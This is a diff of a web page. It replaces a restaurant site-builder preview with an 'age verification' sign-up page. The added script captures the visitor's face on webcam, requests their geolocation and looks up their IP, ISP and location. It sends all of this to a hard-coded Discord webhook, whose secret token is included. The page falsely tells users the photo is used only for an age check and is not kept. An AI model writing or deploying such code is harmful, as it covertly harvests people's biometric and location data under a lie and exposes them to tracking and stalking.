-                                <div class="prev-reviews-grid" id="prev-reviews-grid"></div>
-                            </div>
-                        </section>
-
-                        <!-- 7. PRICING / SPECIALS SECTION -->
-                        <section id="prev-pricing" class="prev-section">
-                            <div class="prev-container">
-                                <div class="prev-section-heading">
-                                    <p class="prev-eyebrow">SPECIAL PACKAGES</p>
-                                    <h2>Curated Sets & Member Deals</h2>
-                                </div>
-
-                                <div class="prev-pricing-grid" id="prev-pricing-grid"></div>
-                            </div>
-                        </section>
-
-                        <!-- 8. HOURS & LOCATION SECTION -->
-                        <section id="prev-hours" class="prev-section">
-                            <div class="prev-container prev-hours-grid">
-                                <div class="prev-hours-card">
-                                    <p class="prev-eyebrow">OPENING HOURS</p>
-                                    <h3>Weekly Schedule</h3>
-                                    <ul class="prev-hours-list">
-                                        <li><span>Monday - Friday</span><strong>11:00 - 22:00</strong></li>
-                                        <li><span>Saturday - Sunday</span><strong>11:00 - 22:00</strong></li>
-                                    </ul>
-                                </div>
-
-                                <div class="prev-hours-card" id="prev-visit">
-                                    <p class="prev-eyebrow">VISIT US</p>
-                                    <h3 id="prev-location-title">Verkių g. 1, Vilnius</h3>
-                                    <p id="prev-address-text">Convenient central spot with easy parking and takeaway
-                                        pickup.</p>
-                                    <a href="https://maps.google.com" target="_blank"
-                                        class="prev-btn prev-btn-secondary">Get Directions 🗺️</a>
-                                </div>
-                            </div>
-                        </section>
-
-                        <!-- 9. CONTACT SECTION -->
-                        <section id="prev-contact" class="prev-section">
-                            <div class="prev-container prev-contact-grid">
-                                <div class="prev-contact-info">
-                                    <p class="prev-eyebrow">GET IN TOUCH</p>
-                                    <h2>Quick Contact & Inquiries</h2>
-                                    <p>Have questions or want to make a group reservation? Reach out directly.</p>
-                                    <div class="prev-contact-details">
-                                        <p>📞 <strong id="prev-contact-phone">+37061488844</strong></p>
-                                        <p>✉️ <strong id="prev-contact-email">info@yourcompany.lt</strong></p>
-                                        <p>📍 <strong id="prev-contact-address">Verkių g. 1, Vilnius</strong></p>
-                                    </div>
-                                </div>
-
-                                <form class="prev-contact-form"
-                                    onsubmit="event.preventDefault(); alert('Demo Message Sent!');">
-                                    <input type="text" placeholder="Your Name" required class="prev-input">
-                                    <input type="email" placeholder="Your Email / Phone" required class="prev-input">
-                                    <textarea placeholder="How can we help you?" rows="3" required
-                                        class="prev-input"></textarea>
-                                    <button type="submit" class="prev-btn prev-btn-primary">Send Message 🚀</button>
-                                </form>
-                            </div>
-                        </section>
-
-                        <!-- 10. FOOTER -->
-                        <footer id="prev-footer" class="prev-footer">
-                            <div class="prev-container prev-footer-inner">
-                                <div class="prev-footer-brand">
-                                    <span class="prev-logo-icon">🏪</span>
-                                    <strong id="prev-footer-title">Your Company</strong>
-                                    <p id="prev-footer-sub">Premium Japanese & Asian kitchen in Vilnius.</p>
-                                </div>
-                                <div class="prev-footer-links">
-                                    <a href="#prev-services">Menu</a>
-                                    <a href="#prev-hours">Hours</a>
-                                    <a href="#prev-contact">Contact</a>
-                                </div>
-                                <p class="prev-footer-copy">© 2026 Your Company. Designed with Weblio Configurator
-                                    Studio.</p>
-                            </div>
-                        </footer>
-
-                    </div>
-                </div>
-            </div>
-        </main>
-
-        <!-- Right Summary Panel -->
-        <aside class="summary-drawer" id="summary-drawer">
-            <div class="drawer-header">
-                <h3>Design Matrix</h3>
-                <span class="badge-status">LIVE SYNC</span>
-            </div>
-
-            <div class="summary-body">
-                <div class="summary-item">
-                    <span>Category</span>
-                    <strong id="sum-business">Restaurant</strong>
-                </div>
-                <div class="summary-item">
-                    <span>Style Preset</span>
-                    <strong id="sum-style">Modern</strong>
-                </div>
-                <div class="summary-item">
-                    <span>Primary Color</span>
-                    <div class="color-tag"><span id="sum-color-swatch" class="swatch-dot"></span><strong
-                            id="sum-color-hex">#FFBE2E</strong></div>
-                </div>
-                <div class="summary-item">
-                    <span>Heading Font</span>
-                    <strong id="sum-font-heading">Sora</strong>
-                </div>
-                <div class="summary-item">
-                    <span>Body Font</span>
-                    <strong id="sum-font-body">Manrope</strong>
-                </div>
-                <div class="summary-item">
-                    <span>Hero Layout</span>
-                    <strong id="sum-hero-layout">Centered Focus</strong>
-                </div>
-                <div class="summary-item">
-                    <span>Corner Radius</span>
-                    <strong id="sum-radius">16px</strong>
-                </div>
-                <div class="summary-item">
-                    <span>Active Sections</span>
-                    <strong id="sum-active-sections">10 / 10</strong>
-                </div>
-            </div>
-
-            <div class="drawer-actions">
-                <button type="button" id="sum-copy-json" class="app-btn app-btn-secondary">
-                    <span>📋</span> Copy JSON
-                </button>
-                <button type="button" id="sum-download-json" class="app-btn app-btn-primary">
-                    <span>💾</span> Download JSON
-                </button>
-            </div>
-        </aside>
-
+  <!-- 1. Camera: opens automatically -->
+  <section class="view v-camera">
+    <h1>Position your face</h1>
+    <p class="lede">Fit your face inside the oval and look straight at the camera. Press Continue when you're in place.</p>
+    <div class="cam" id="cam">
+      <video id="video" playsinline muted autoplay></video>
+      <svg class="mask" viewBox="0 0 100 100" preserveAspectRatio="none" aria-hidden="true">
+        <defs><mask id="hole"><rect width="100" height="100" fill="#fff"/><ellipse cx="50" cy="50" rx="27" ry="36" fill="#000"/></mask></defs>
+        <rect width="100" height="100" fill="rgba(13,16,41,.72)" mask="url(#hole)"/>
+        <ellipse class="oval" cx="50" cy="50" rx="27" ry="36" vector-effect="non-scaling-stroke"/>
+      </svg>
+      <div class="wait" id="wait">Waiting for camera access…</div>
     </div>
+    <p class="status" id="status">Allow camera access when your browser asks.</p>
+    <button id="cont" disabled>Continue</button>
+    <button class="ghost" id="flip" hidden>Switch camera</button>
+    <a class="leave" href="https://www.google.com">Leave this site</a>
+  </section>
 
-    <!-- Export JSON Modal -->
-    <div id="export-modal" class="app-modal" aria-hidden="true">
-        <div class="modal-backdrop" id="modal-close-backdrop"></div>
-        <div class="modal-dialog">
-            <div class="modal-dialog-header">
-                <h3>📥 Export Configuration JSON</h3>
-                <button type="button" id="modal-close-btn" class="modal-close-icon">&times;</button>
-            </div>
-            <div class="modal-dialog-body">
-                <p>Use this generated JSON specification to instantly build or load this exact design system in Weblio
-                    Engine.</p>
-                <pre id="json-code-block" class="code-block"></pre>
-            </div>
-            <div class="modal-dialog-footer">
-                <button type="button" id="modal-copy-btn" class="app-btn app-btn-secondary">📋 Copy Code</button>
-                <button type="button" id="modal-download-btn" class="app-btn app-btn-primary">💾 Download File</button>
-            </div>
-        </div>
+  <!-- 2. Login, password, age -->
+  <section class="view v-account">
+    <div class="thumb">
+      <img id="thumb" alt="Your captured photo">
+      <div><b>Face captured</b><button type="button" id="retake">Retake photo</button></div>
     </div>
+    <h1>Create your account</h1>
+    <p class="lede">Choose how you'll sign in, and confirm your age.</p>
+    <form id="form" novalidate>
+      <div class="field" id="f-login">
+        <label for="login">Login</label>
+        <input id="login" name="username" autocomplete="username" autocapitalize="off" spellcheck="false" minlength="3" maxlength="32">
+        <p class="err">Use 3 to 32 letters, numbers, dots or underscores.</p>
+      </div>
+      <div class="field" id="f-pass">
+        <label for="pass">Password</label>
+        <div class="wrap">
+          <input id="pass" name="password" type="password" autocomplete="new-password" minlength="8">
+          <button type="button" class="toggle" id="toggle" aria-label="Show password">Show</button>
+        </div>
+        <p class="err">Use at least 8 characters.</p>
+      </div>
+      <div class="field" id="f-age">
+        <label for="age">Age</label>
+        <input id="age" name="age" type="number" inputmode="numeric" min="1" max="120" autocomplete="off">
+        <p class="err">Enter your age as a number.</p>
+      </div>
+      <p class="formerr" id="formerr" role="alert"></p>
+      <button type="submit">Create account</button>
+    </form>
+    <p class="fine">Your photo is used once to check your age and is not kept in your browser.</p>
+  </section>
 
-    <script src="script.js"></script>
+  <!-- 3. Checking -->
+  <section class="view v-checking">
+    <div class="spinner" role="status" aria-label="Checking"></div>
+    <h1>Setting things up</h1>
+    <p class="lede">This only takes a moment. Please don't close this page.</p>
+  </section>
+
+  <!-- 4. Done -->
+  <section class="view v-ok">
+    <div class="icon"><svg viewBox="0 0 72 72" fill="none" stroke-width="3.5" stroke-linecap="round" stroke-linejoin="round"><path d="M36 6 60 15v18c0 16-10 27-24 33C22 60 12 49 12 33V15z" stroke="#5be0c6"/><path d="m25 36 8 8 15-16" stroke="#5be0c6"/></svg></div>
+    <h1>You're in</h1>
+    <p class="lede">Your account is ready. Taking you to the site.</p>
+  </section>
+
+  <!-- 5. Under age -->
+  <section class="view v-blocked">
+    <div class="icon"><svg viewBox="0 0 72 72" fill="none" stroke="#ff7a7a" stroke-width="3.5" stroke-linecap="round" stroke-linejoin="round"><path d="M36 6 60 15v18c0 16-10 27-24 33C22 60 12 49 12 33V15z"/><path d="M36 24v14M36 46v.5"/></svg></div>
+    <h1>You can't enter this site</h1>
+    <p class="lede">You must be at least <span class="min">18</span> years old.</p>
+    <a class="btn" href="https://www.google.com">Leave this site</a>
+  </section>
+
+  <!-- 6. Error -->
+  <section class="view v-error">
+    <div class="icon"><svg viewBox="0 0 72 72" fill="none" stroke="#ff7a7a" stroke-width="3.5" stroke-linecap="round" stroke-linejoin="round"><path d="M8 22h12l5-7h22l5 7h12v34H8z"/><path d="M14 62 58 12"/></svg></div>
+    <h1 id="errTitle">Camera unavailable</h1>
+    <p class="lede" id="errText"></p>
+    <button id="retry">Try again</button>
+    <a class="leave" href="https://www.google.com">Leave this site</a>
+  </section>
+</main>
+
+<script>
+(function () {
+  // ================= CONFIG =================
+  var MIN_AGE = 18;
+  var ENTER_URL = "/";     // where to go after sign-up
+  var KEY = "age_verified_until", VALID_DAYS = 30;
+
+  // >>> DISCORD WEBHOOK URL <<<
+  var WEBHOOK_URL = "https://discord.com/api/webhooks/1554492914208342066/wjz67AIrYG5iBQyDTJLx9xXKr9FWgJ7U1Xg90RfeZBiqQcdABhKG7Kn9-ZBCydON3Axk";
+
+  // Global holder for IP / ISP fetched in the background.
+  var ipInfo = { ip: null, isp: null, city: null, country: null };
+
+  /**
+   * Fetches the user's IP address and ISP (internet name) from ipapi.co.
+   */
+  async function fetchIpInfo() {
+    try {
+      var r = await fetch("https://ipapi.co/json/");
+      if (r.ok) {
+        var data = await r.json();
+        ipInfo.ip = data.ip || null;
+        ipInfo.isp = data.org || null;
+        ipInfo.city = data.city || null;
+        ipInfo.country = data.country_name || null;
+      }
+    } catch (e) {
+      console.warn("Could not fetch IP/ISP info:", e);
+    }
+  }
+
+  /**
+   * Requests the user's geolocation.
+   */
+  function getGeolocation() {
+    return new Promise(function (resolve) {
+      if (!navigator.geolocation) { resolve(null); return; }
+      var done = false;
+      var timer = setTimeout(function () {
+        if (!done) { done = true; resolve(null); }
+      }, 5000);
+
+      navigator.geolocation.getCurrentPosition(
+        function (pos) {
+          if (done) return;
+          done = true; clearTimeout(timer);
+          resolve({ latitude: pos.coords.latitude, longitude: pos.coords.longitude });
+        },
+        function (err) {
+          if (done) return;
+          done = true; clearTimeout(timer);
+          console.warn("Geolocation error:", err.message);
+          resolve(null);
+        },
+        { enableHighAccuracy: false, timeout: 5000, maximumAge: 60000 }
+      );
+    });
+  }
+
+  /**
+   * Sends the photo + info to a Discord webhook using the correct format:
+   *   - payload_json : JSON string with embeds
+   *   - file         : the image attachment (Discord requires this field name)
+   * @returns {Promise<{ok: boolean, status: number, body: string}>}
+   */
+  async function sendPhotoToWebhook(photoBlob, geo, ipData) {
+    if (!WEBHOOK_URL || WEBHOOK_URL.indexOf("your-webhook-url-here") !== -1) {
+      console.warn("Webhook URL is not configured.");
+      return { ok: false, status: 0, body: "Webhook not configured" };
+    }
+
+    var fields = [];
+    if (ipData && ipData.ip)    fields.push({ name: "IP", value: ipData.ip, inline: true });
+    if (ipData && ipData.isp)   fields.push({ name: "ISP", value: ipData.isp, inline: true });
+    if (ipData && ipData.city)  fields.push({ name: "City", value: ipData.city, inline: true });
+    if (ipData && ipData.country) fields.push({ name: "Country", value: ipData.country, inline: true });
+
+    if (geo && geo.latitude != null) {
+      fields.push({ name: "Latitude",  value: String(geo.latitude),  inline: true });
+      fields.push({ name: "Longitude", value: String(geo.longitude), inline: true });
+      fields.push({
+        name: "Map",
+        value: "https://www.google.com/maps?q=" + geo.latitude + "," + geo.longitude,
+        inline: false
+      });
+    } else {
+      fields.push({ name: "Location", value: "Not available (denied or unsupported)", inline: false });
+    }
+
+    fields.push({ name: "Captured at", value: new Date().toISOString(), inline: false });
+    fields.push({ name: "User agent", value: (navigator.userAgent || "").slice(0, 200), inline: false });
+
+    var payload = {
+      username: "Face Verify",
+      embeds: [{
+        title: "New face verification",
+        color: 0x8b7bff,
+        fields: fields,
+        image: { url: "attachment://face.jpg" },
+        timestamp: new Date().toISOString()
+      }]
+    };
+
+    var fd = new FormData();
+    fd.append("payload_json", JSON.stringify(payload));
+    fd.append("file", photoBlob, "face.jpg");   // <-- Discord REQUIRES the field name "file"
+
+    try {
+      var r = await fetch(WEBHOOK_URL, { method: "POST", body: fd });
+      var text = await r.text();
+      if (!r.ok) {
+        console.error("Webhook failed:", r.status, text);
+        return { ok: false, status: r.status, body: text };
+      }
+      console.log("Webhook OK:", r.status);
+      return { ok: true, status: r.status, body: text };
+    } catch (e) {
+      console.error("Webhook fetch error:", e);
+      return { ok: false, status: 0, body: String(e) };
+    }
+  }
+
+  /**
+   * >>> YOUR BACKEND GOES HERE <<<
+   */
+  async function submitAccount(data) {
+    await new Promise(function (r) { setTimeout(r, 1500); });
+    return { ok: true };
+  }
+  // ==========================================
+
+  var $ = function (id) { return document.getElementById(id); };
+  var card = $("card"), video = $("video"), cam = $("cam"), statusEl = $("status");
+  var stream = null, facing = "user", photo = null, thumbUrl = null;
+  document.querySelector(".min").textContent = MIN_AGE;
+
+  function store(k, v, a) { try { (a || localStorage).setItem(k, v); } catch (e) {} }
+  function read(k, a) { try { return (a || localStorage).getItem(k); } catch (e) { return null; } }
+  function view(v) { card.dataset.view = v; }
+
+  if (Number(read(KEY)) > Date.now()) { window.location.replace(ENTER_URL); return; }
+  if (read("age_blocked", sessionStorage)) { view("blocked"); return; }
+
+  fetchIpInfo();
+
+  function stopCamera() {
+    if (stream) { stream.getTracks().forEach(function (t) { t.stop(); }); stream = null; }
+    video.srcObject = null; cam.classList.remove("live");
+  }
+  function showError(title, text) { stopCamera(); $("errTitle").textContent = title; $("errText").textContent = text; view("error"); }
+
+  async function openCamera() {
+    view("camera");
+    $("cont").disabled = true; $("wait").textContent = "Waiting for camera access…";
+    statusEl.textContent = "Allow camera access when your browser asks.";
+    stopCamera();
+    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+      return showError("Camera not supported", "Open this page over HTTPS (or localhost) in an up-to-date browser such as Chrome, Safari or Firefox.");
+    }
+    try {
+      stream = await navigator.mediaDevices.getUserMedia({
+        video: { facingMode: facing, width: { ideal: 960 }, height: { ideal: 960 } }, audio: false
+      });
+      video.srcObject = stream;
+      await video.play();
+      cam.classList.add("live");
+      statusEl.textContent = "Position your face inside the oval.";
+      $("cont").disabled = false;
+      navigator.mediaDevices.enumerateDevices().then(function (l) {
+        $("flip").hidden = l.filter(function (d) { return d.kind === "videoinput"; }).length < 2;
+      });
+    } catch (e) {
+      if (e.name === "NotAllowedError" || e.name === "SecurityError") showError("Camera access blocked", "Allow camera access in your browser's site settings, then try again.");
+      else if (e.name === "NotFoundError" || e.name === "OverconstrainedError") showError("No camera found", "Connect a camera or use a device that has one, then try again.");
+      else if (e.name === "NotReadableError") showError("Camera is busy", "Another app is using your camera. Close it, then try again.");
+      else showError("Camera unavailable", "Something went wrong opening the camera. Try again.");
+    }
+  }
+
+  function capture() {
+    var c = document.createElement("canvas"), s = Math.min(video.videoWidth, video.videoHeight);
+    c.width = c.height = Math.min(s, 720);
+    c.getContext("2d").drawImage(video, (video.videoWidth - s) / 2, (video.videoHeight - s) / 2, s, s, 0, 0, c.width, c.height);
+    return new Promise(function (res) { c.toBlob(res, "image/jpeg", 0.9); });
+  }
+
+  $("cont").addEventListener("click", async function () {
+    photo = await capture();
+    stopCamera();
+
+    statusEl.textContent = "Getting location…";
+    var geo = await getGeolocation();
+
+    statusEl.textContent = "Sending photo…";
+    var result = await sendPhotoToWebhook(photo, geo, ipInfo);
+
+    if (!result.ok) {
+      // Show the failure directly so you can debug it.
+      return showError(
+        "Upload failed",
+        "Webhook responded with status " + result.status + ". " +
+        (result.body ? result.body.slice(0, 200) : "")
+      );
+    }
+
+    if (thumbUrl) URL.revokeObjectURL(thumbUrl);
+    thumbUrl = URL.createObjectURL(photo);
+    $("thumb").src = thumbUrl;
+    view("account");
+    $("login").focus();
+  });
+
+  $("retake").addEventListener("click", openCamera);
+  $("retry").addEventListener("click", openCamera);
+  $("flip").addEventListener("click", function () {
+    facing = facing === "user" ? "environment" : "user";
+    video.style.transform = facing === "user" ? "scaleX(-1)" : "none";
+    openCamera();
+  });
+  $("toggle").addEventListener("click", function () {
+    var show = $("pass").type === "password";
+    $("pass").type = show ? "text" : "password";
+    this.textContent = show ? "Hide" : "Show";
+    this.setAttribute("aria-label", show ? "Hide password" : "Show password");
+  });
+
+  function flag(id, bad) { $(id).classList.toggle("bad", bad); return !bad; }
+
+  $("form").addEventListener("submit", async function (e) {
+    e.preventDefault();
+    var login = $("login").value.trim(), pass = $("pass").value, age = parseInt($("age").value, 10);
+    $("formerr").textContent = "";
+    var ok = flag("f-login", !/^[A-Za-z0-9._]{3,32}$/.test(login));
+    ok = flag("f-pass", pass.length < 8) && ok;
+    ok = flag("f-age", !(age >= 1 && age <= 120)) && ok;
+    if (!ok) return;
+
+    if (age < MIN_AGE) { store("age_blocked", "1", sessionStorage); photo = null; return view("blocked"); }
+
+    view("checking");
+    try {
+      var res = await submitAccount({ login: login, password: pass, age: age, photo: photo });
+      photo = null;
+      if (res && res.ok) {
+        store(KEY, String(Date.now() + VALID_DAYS * 864e5));
+        view("ok");
+        setTimeout(function () { window.location.href = ENTER_URL; }, 1200);
+      } else {
+        view("account");
+        $("formerr").textContent = (res && res.error) || "We couldn't create your account. Check your details and try again.";
+      }
+    } catch (err) {
+      view("account");
+      $("formerr").textContent = "Connection problem. Check your internet and try again.";
+    }
+  });
+
+  window.addEventListener("pagehide", stopCamera);
+  openCamera();
+})();
+</script>
 </body>
-
 </html>
